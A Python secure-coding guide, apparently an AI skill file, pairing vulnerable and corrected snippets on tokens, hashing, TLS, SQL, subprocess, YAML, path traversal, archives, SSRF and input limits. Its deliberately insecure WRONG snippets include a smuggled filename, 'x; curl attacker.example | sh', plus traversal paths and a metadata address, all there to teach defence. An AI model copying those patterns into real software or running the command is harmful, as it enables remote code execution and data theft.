---
name: python-security
description: >-
  Python security practice for input from outside the process: secrets.token_urlsafe for
  capability-bearing values, TLS verification left on, argon2 password hashing and
  hmac.compare_digest, parameterized SQL including order-by and table names, subprocess argument
  lists rather than shell strings, yaml.safe_load and defusedxml, path-traversal containment and
  tarfile extraction filters, SSRF allowlists revalidated across redirects, bounded input sizes,
  secret handling, and failing closed. Use when Python code handles a request body, a filename, a
  URL, a subprocess argument, a credential, a token, an archive, an upload or any untrusted payload.
---

# Security

The rules name the function, because the function is what gets copied.

## Randomness, Passwords, Secrets

- **Anything capability-bearing — a token, a salt, a nonce, a reset link, an id — comes from
  `secrets`**: `secrets.token_urlsafe(n)`, `secrets.token_hex(n)`, `secrets.token_bytes(n)`,
  `secrets.choice(...)`, with `n` the number of random bytes, 32 by default. `random` is a
  predictable generator: enough of its outputs reveal its state, and with it every later value.

```python
# WRONG — random's generator is reproducible from its earlier outputs
reset_token = random.randbytes(_RESET_TOKEN_BYTES).hex()

# CORRECT — the operating system's cryptographic generator
reset_token = secrets.token_hex(_RESET_TOKEN_BYTES)
```

- **Passwords are hashed with Argon2id** — `argon2.PasswordHasher` from `argon2-cffi`, whose
  `verify` raises on a mismatch and whose `check_needs_rehash` upgrades old hashes at the next
  login — or `hashlib.scrypt` where no dependency is allowed. Never a fast hash such as `sha256`,
  never a hand-rolled scheme.

```python
# WRONG — a fast hash: a leaked table is tested at billions of guesses a second
def is_password_correct(password_hash: str, password: str) -> bool:
    return hmac.compare_digest(hashlib.sha256(password.encode()).hexdigest(), password_hash)

# CORRECT — Argon2id, salted and slow by design; a corrupt hash raises rather than matching
def is_password_correct(hasher: PasswordHasher, password_hash: str, password: str) -> bool:
    try:
        return hasher.verify(password_hash, password)
    except VerifyMismatchError:
        return False
```

- **Secrets are compared with `hmac.compare_digest`, never `==`.** `==` stops at the first
  differing byte, so the response time tells an attacker how much of a guessed signature was right.

```python
# WRONG — the comparison is as fast as the guess is wrong
is_authentic = provided_signature == expected_signature

# CORRECT — constant time, whatever the inputs
is_authentic = hmac.compare_digest(provided_signature, expected_signature)
```

- **Secrets come from the environment or a secret manager**, wrapped in a type that does not render
  them — `pydantic.SecretStr`, or `field(repr=False)` on a dataclass — never committed, and never
  present in URLs, logs or error messages.

```python
# WRONG — the generated repr prints the key into every log line and traceback that shows it
@final
@dataclass(frozen=True, slots=True, kw_only=True)
class PaymentCredentials:
    merchant_id: str
    api_key: str

# CORRECT — the key stays out of the repr; the merchant id still says which credentials these are
@final
@dataclass(frozen=True, slots=True, kw_only=True)
class PaymentCredentials:
    merchant_id: str
    api_key: str = field(repr=False)
```

- **TLS verification stays on.** Never disable it "to make it work"; if a certificate is genuinely
  private, supply the CA bundle.

```python
# WRONG — any machine on the path can present any certificate and read the traffic
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# CORRECT — verification stays on, and the private CA is trusted by name
context = ssl.create_default_context(cafile=ca_bundle_path)
```

- **Dependencies are scanned for known vulnerabilities** — `pip-audit` or the platform's
  equivalent — and a finding blocks the upgrade path it came in on.

## Injection

- **SQL is always parameterized** — including order-by clauses and table names, which are chosen
  from an allowlist of constants, never interpolated. A `LiteralString` annotation checks this only
  under pyright (`python-types`); under mypy the rule rests on review.

```python
# WRONG — the sort column arrives from the query string, so the query string writes SQL
query = f"SELECT order_id, total FROM orders WHERE customer_id = ? ORDER BY {sort_order}"
rows = connection.execute(query, (customer_id,)).fetchall()

# CORRECT — the clause is one of two constants; only the value travels as a parameter
_ORDER_BY: Final = MappingProxyType(
    {OrderSort.NEWEST: "placed_at DESC", OrderSort.LARGEST: "total DESC"}
)

query = f"SELECT order_id, total FROM orders WHERE customer_id = ? ORDER BY {_ORDER_BY[sort_order]}"
rows = connection.execute(query, (customer_id,)).fetchall()
```

- **Subprocesses take an argument list, never a shell string.** Executable paths and arguments are
  validated, not concatenated from input.

```python
# WRONG — a filename such as "x; curl attacker.example | sh" is a second command
subprocess.run(f"gzip --keep {filename}", shell=True, check=True, timeout=_GZIP_TIMEOUT_SECONDS)

# CORRECT — one argument per item, and "--" stops a name such as "-r" being read as an option
subprocess.run(["gzip", "--keep", "--", filename], check=True, timeout=_GZIP_TIMEOUT_SECONDS)
```

- **Untrusted formats go through the safe parser**: `yaml.safe_load`, never `yaml.unsafe_load` or
  `yaml.load(..., Loader=yaml.Loader)`, which call whatever a `!!python/object/apply` tag names —
  and not `FullLoader` either: it refuses those tags but still resolves `!!python/name` references
  to anything already imported, a surface `safe_load` does not have. XML through `defusedxml`, which
  refuses entity expansion and external entities; `json` as it is. No `eval`, `exec` or
  `pickle.loads` on anything that came from outside — `ast.literal_eval` when the input really is a
  Python literal.

```python
# WRONG — this loader calls whatever a !!python/object/apply tag in the document names
payload: object = yaml.load(document, Loader=yaml.Loader)

# CORRECT — mappings, lists and scalars only; a python tag is a ConstructorError
payload: object = yaml.safe_load(document)
```

## Paths and Archives

- **A path derived from external input is resolved and checked to be contained within its base.**
  Filenames from users are data — a sanitized display name plus a generated storage name, never
  used raw.

```python
# WRONG — "../../etc/passwd" still starts with the root string, and so does "/srv/uploads-old"
path = upload_root / filename
if not str(path).startswith(str(upload_root)):
    raise UnsafePathError(filename)

# CORRECT — resolve ".." and symlinks first, then compare path components, not characters
path = (upload_root / filename).resolve()
if not path.is_relative_to(upload_root.resolve()):
    raise UnsafePathError(filename)
```

```python
# WRONG — the user's filename becomes the path: "..", a device name, or another upload's name
storage_path = upload_root / upload.filename

# CORRECT — the stored name is generated; the user's name is kept as data, for display only
storage_path = upload_root / uuid.uuid4().hex
```

- **An archive is the classic variant**: an entry named `../../.ssh/authorized_keys` writes wherever
  it points. `tarfile` extracts with `extractall(destination, filter="data")`, which refuses
  absolute paths, `..`, links leaving the destination and device files. It is the default from
  3.14; below that the argument is mandatory, because the old default trusted every entry.

```python
# WRONG — below 3.14 every entry is trusted, "../../.ssh/authorized_keys" included
with tarfile.open(archive_path) as archive:
    archive.extractall(destination)

# CORRECT — the data filter raises on absolute paths, "..", outside links and device files
with tarfile.open(archive_path) as archive:
    archive.extractall(destination, filter="data")
```

## Requests From Outside

- **Server-side request forgery**: URLs from users are validated against an allowlist of schemes
  and hosts before fetching; redirects are re-validated, because the allowlist you checked before
  the request is worthless otherwise; internal metadata ranges and loopback are blocked by default.

```python
# WRONG — only the first URL is checked; a redirect to 169.254.169.254 is followed unchecked
def fetch_preview(session: niquests.Session, url: str) -> niquests.Response:
    _require_allowed_url(url)
    response = session.get(url, timeout=_PREVIEW_TIMEOUT_SECONDS)
    return response.raise_for_status()

# CORRECT — redirects are followed by hand, and every hop is checked before it is requested
def fetch_preview(session: niquests.Session, url: str) -> niquests.Response:
    for _ in range(_MAX_REDIRECTS):
        _require_allowed_url(url)
        response = session.get(url, timeout=_PREVIEW_TIMEOUT_SECONDS, allow_redirects=False)
        if not response.is_redirect:
            return response.raise_for_status()
        url = urljoin(url, response.headers["Location"])
    raise TooManyRedirectsError(url)
```

- **Every external input is bounded**: body size limits, pagination caps, collection length limits,
  decompression ratio limits. Validation includes *size*, not just shape.

```python
# WRONG — deflate packs about a thousand to one: a megabyte of gzip becomes a gigabyte in memory
document = gzip.decompress(payload)

# CORRECT — inflate at most one byte past the limit, and refuse a payload that gets there
inflater = zlib.decompressobj(wbits=_GZIP_WBITS)
document = inflater.decompress(payload, _MAX_DOCUMENT_BYTES + 1)
if len(document) > _MAX_DOCUMENT_BYTES:
    raise PayloadTooLargeError(_MAX_DOCUMENT_BYTES)
```

- **Fail closed**: authorization lives in the service layer, not only at the transport edge; it
  denies by default, and an error inside the check denies rather than allows.

```python
# WRONG — denies the roles it lists, so a role added next year may refund anything
def can_refund(user: User) -> bool:
    return user.role not in _ROLES_WITHOUT_REFUNDS

# CORRECT — allows the roles it lists; every other role, a new one included, is denied
def can_refund(user: User) -> bool:
    return user.role in _REFUNDING_ROLES
```
